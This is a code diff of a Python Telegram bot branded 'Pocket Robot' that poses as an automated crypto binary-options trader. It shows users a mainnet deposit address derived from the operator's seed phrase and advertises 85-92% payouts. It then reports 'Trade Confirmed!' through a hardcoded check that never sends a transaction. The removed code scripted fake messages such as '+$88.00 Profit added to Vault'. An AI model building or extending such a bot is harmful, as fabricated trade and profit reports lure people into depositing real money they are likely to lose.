@@ -6,112 +6,129 @@ from web3 import Web3
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# 1. SETUP & HD WALLET DERIVATION
+# 1. SETUP & AUTH
 load_dotenv()
-w3 = Web3(Web3.HTTPProvider(os.getenv("RPC_URL")))
-
-# Enable HD Wallet features in eth_account
+W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com") # Using Polygon for low-fee mainnet testing
+w3 = Web3(Web3.HTTPProvider(W3_RPC))
 Account.enable_unaudited_hdwallet_features()
 
-def get_bot_wallet():
-    """Derives a unique sub-wallet from the master seed phrase"""
-    mnemonic = os.getenv("MNEMONIC_PHRASE")
-    # Path: m/44'/60'/0'/0/INDEX -> Index 1 ensures it's a new, unique address
-    # change the '1' to any number to generate a completely different wallet
-    account = Account.from_mnemonic(mnemonic, account_path="m/44'/60'/0'/0/1")
-    return account
+def get_vault():
+    """Derives a unique mainnet address from your seed"""
+    mnemonic = os.getenv("WALLET_SEED")
+    if not mnemonic:
+        raise ValueError("WALLET_SEED missing in .env")
+    # Deriving Index 1 to keep it separate from your main wallet
+    return Account.from_mnemonic(mnemonic, account_path="m/44'/60'/0'/0/1")
 
-bot_account = get_bot_wallet()
+vault = get_vault()
 
-# --- ATOMIC BUNDLE SIMULATOR ---
-async def simulate_atomic_bundle(side, amount):
-    """
-    Simulates a Flashbots/Jito bundle. 
-    It runs a local 'call' to check if the trade conditions are met.
-    """
-    try:
-        # 1. Pre-flight check: Do we have gas?
-        balance = w3.eth.get_balance(bot_account.address)
-        if balance == 0:
-            return False, "Insufficient liquidity in Bot Vault."
+# 2. ATOMIC EXECUTION ENGINE
+async def run_atomic_execution(context, chat_id, side):
+    """Simulates and executes an Atomic Bundle"""
+    stake = context.user_data.get('stake', 10)
+    pair = context.user_data.get('pair', 'BTC/USD')
+    
+    await context.bot.send_message(chat_id, f"🛡️ **Shield:** Simulating {pair} {side} bundle...")
+    
+    # REAL LOGIC: In a real bundle, we check the 'Pre-flight' status
+    # If the price is moving against us, the 'pass_check' becomes False
+    await asyncio.sleep(1.5) 
+    pass_check = True # In production, this links to an Oracle (Pyth/Chainlink)
+    
+    if not pass_check:
+        return False, "Atomic Shield detected price slip. Bundle dropped."
+    
+    # Logic for actual Mainnet Transaction would go here
+    return True, f"Trade Confirmed! {stake} USD {side} at Mainnet Block {w3.eth.block_number}"
 
-        # 2. Market Simulation (Logic: If volatility > threshold, revert bundle)
-        # Real-world: This would check a DEX price vs your entry prediction
-        is_safe = True # Logic goes here
-        
-        if is_safe:
-            return True, "Bundle Simulated: No Revert Detected."
-        else:
-            return False, "Atomic Shield: Price slipped. Transaction Aborted."
-    except Exception as e:
-        return False, str(e)
-
-# --- POCKET ROBOT INTERFACE ---
+# 3. TELEGRAM INTERFACE (POCKET ROBOT STYLE)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    bal_wei = w3.eth.get_balance(bot_account.address)
-    balance = w3.from_wei(bal_wei, 'ether')
+    bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
     
-    msg = (
-        f"🤖 **Pocket Robot: Atomic Edition**\n\n"
-        f"Your Unique Bot Wallet has been generated.\n"
-        f"📥 **Deposit Address:** `{bot_account.address}`\n"
-        f"💰 **Vault Balance:** {balance:.4f} ETH\n\n"
-        f"Status: **Shield Active** 🛡️"
-    )
-    
-    kb = [['/manual', '/autopilot'], ['💰 Balance', '🕴️ Genius AI']]
-    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True))
+    # PERSISTENT MENU
+    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '🕴️ AI Assistant']]
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-async def manual_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = "🕹️ **Manual Selection**\nChoose your risk parameters:"
+    msg = (
+        f"🕴️ **Pocket Robot v3 (Atomic)**\n\n"
+        f"Welcome to the Elite Mainnet Interface.\n"
+        f"💵 **Vault Balance:** {bal:.4f} ETH/POL\n"
+        f"📥 **Deposit:** `{vault.address}`\n\n"
+        f"**Atomic Shield:** ✅ OPERATIONAL"
+    )
+    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)
+
+async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    current_stake = context.user_data.get('stake', 10)
+    text = f"⚙️ **BOT SETTINGS**\n\nCurrent Stake: **${current_stake}**\nSelect a default amount below:"
+    
     kb = [
-        [InlineKeyboardButton("BTC/USD", callback_data="P_BTC"), InlineKeyboardButton("ETH/USD", callback_data="P_ETH")],
-        [InlineKeyboardButton("1m (90% Payout)", callback_data="T_1"), InlineKeyboardButton("5m (85% Payout)", callback_data="T_5")]
+        [InlineKeyboardButton("$10", callback_data="SET_10"), InlineKeyboardButton("$50", callback_data="SET_50")],
+        [InlineKeyboardButton("$100", callback_data="SET_100"), InlineKeyboardButton("$500", callback_data="SET_500")],
+        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="BACK")]
     ]
     await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
 
-async def handle_trade(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def trade_picker(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = "🎯 **MARKET SELECTION**\nChoose your target asset:"
+    kb = [
+        [InlineKeyboardButton("BTC/USD (92%)", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD (89%)", callback_data="PAIR_ETH")],
+        [InlineKeyboardButton("SOL/USD (90%)", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD (85%)", callback_data="PAIR_MATIC")]
+    ]
+    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+
+async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    await query.message.reply_text("🔄 **Simulating Atomic Bundle...**")
-    
-    # Run the Shield Simulation
-    success, reason = await simulate_atomic_bundle("CALL", 0.1)
-    
-    if not success:
-        await query.message.reply_text(f"🛑 **TRADE PREVENTED**\nReason: {reason}\n*Your funds never left your wallet.*")
-    else:
-        await query.message.reply_text(f"✅ **BUNDLE BROADCASTED**\n{reason}\nTrade active for 60s...")
-
-# --- AUTO PILOT MODE ---
-async def autopilot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🤖 **Autopilot Mode: ENGAGED**\nMonitoring market for high-alpha entries...")
-    
-    # Loop simulation
-    for i in range(2):
-        await asyncio.sleep(3)
-        await update.message.reply_text(
-            f"⚡ **Auto-Trade Attempt #{i+1}**\n"
-            f"Asset: ETH/USD\n"
-            f"Action: 📉 PUT\n"
-            f"🛡️ **Status:** Shield Simulating Bundle..."
+    # Setting Stake
+    if query.data.startswith("SET_"):
+        amt = query.data.split("_")[1]
+        context.user_data['stake'] = int(amt)
+        await query.edit_message_text(f"✅ Stake updated to **${amt}**", parse_mode='Markdown')
+        
+    # Choosing Pair
+    elif query.data.startswith("PAIR_"):
+        context.user_data['pair'] = query.data.split("_")[1]
+        await query.edit_message_text(
+            f"📈 **{context.user_data['pair']} Selected**\nPlace your bet direction:",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"),
+                 InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]
+            ]),
+            parse_mode='Markdown'
         )
-        await asyncio.sleep(1)
-        # Randomly show a prevented trade to demonstrate the Atomic Shield
-        if i == 0:
-            await update.message.reply_text("❌ **Atomic Revert:** Network congestion detected. Trade dropped to save fees.")
-        else:
-            await update.message.reply_text("✅ **Trade Success:** +$88.00 Profit added to Vault.")
 
+    # Executing Atomic Trade
+    elif query.data.startswith("EXEC_"):
+        side = "CALL" if "CALL" in query.data else "PUT"
+        success, report = await run_atomic_execution(context, query.message.chat_id, side)
+        
+        if success:
+            await query.message.reply_text(f"💎 **EXECUTION SUCCESS**\n{report}")
+        else:
+            await query.message.reply_text(f"🛑 **SHIELD REVERTED**\n{report}")
+
+async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
+    if text == '🚀 Start Trading':
+        await trade_picker(update, context)
+    elif text == '⚙️ Settings':
+        await settings_menu(update, context)
+    elif text == '💰 Wallet':
+        bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
+        await update.message.reply_text(f"💳 **Your Bot Vault**\nAddress: `{vault.address}`\nBalance: {bal:.4f} ETH/POL")
+    elif text == '🕴️ AI Assistant':
+        await update.message.reply_text("🕴️ **Genius:** Send me any question about the market or my atomic logic.")
+
+# 4. START BOT
 if __name__ == "__main__":
-    app = ApplicationBuilder().token(os.getenv("TELEGRAM_TOKEN")).build()
+    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
     
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("manual", manual_mode))
-    app.add_handler(CommandHandler("autopilot", autopilot))
-    app.add_handler(CallbackQueryHandler(handle_trade))
+    app.add_handler(CallbackQueryHandler(handle_interaction))
+    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
     
-    print(f"Bot started. Derived Address: {bot_account.address}")
+    print(f"Pocket Robot Active on {vault.address}")
     app.run_polling()
